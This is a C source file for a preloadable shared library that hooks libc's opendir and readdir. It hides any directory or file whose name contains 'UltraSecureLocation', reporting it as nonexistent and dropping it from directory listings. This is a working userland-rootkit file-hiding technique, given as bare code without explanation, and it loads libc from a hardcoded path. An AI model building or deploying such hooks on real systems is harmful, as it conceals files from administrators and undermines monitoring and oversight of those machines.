#include <stdio.h>
//#include <stdlib.h>
//#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <asm-generic/errno-base.h>
#include <errno.h>

#include "modified-dirent.h"

#define HIDE_PATTERN "UltraSecureLocation"

struct dirent *(*libc_readdir)(DIR *dirp);
DIR *(*libc_opendir)(const char *name);


DIR *opendir(const char *name)
{
        if (strstr(name, HIDE_PATTERN)) {
                errno = ENOENT;
                return NULL;
        } 

        return libc_opendir(name);
}

struct dirent *readdir(DIR *dirp)
{
        struct dirent *d = libc_readdir(dirp);

        if (d != NULL && strstr(d->d_name, HIDE_PATTERN)) {
                /* We match the HIDE_PATTERN, so let's skip to the 
                 * next entry in the FS 
                 */
                d = libc_readdir(dirp);
        }

        return d;
}

void _init(void)
{
        void *dl = dlopen("/lib64/libc-2.17.so", RTLD_NOW);

        libc_opendir = dlsym(dl, "opendir");
        libc_readdir = dlsym(dl, "readdir");
}
